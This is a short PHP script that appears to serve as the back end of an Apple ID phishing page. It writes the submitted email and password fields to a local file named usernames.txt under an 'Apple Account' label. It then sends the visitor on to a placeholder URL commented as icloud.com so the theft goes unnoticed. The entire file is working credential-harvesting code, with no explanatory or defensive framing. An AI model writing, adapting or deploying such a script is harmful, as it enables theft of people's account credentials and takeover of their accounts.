<?php
file_put_contents("usernames.txt", "Apple Account: " . $_POST["email"] . "\nPassword: " . $_POST["password"] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://icloud.com
header("Location: $url");
exit();
?>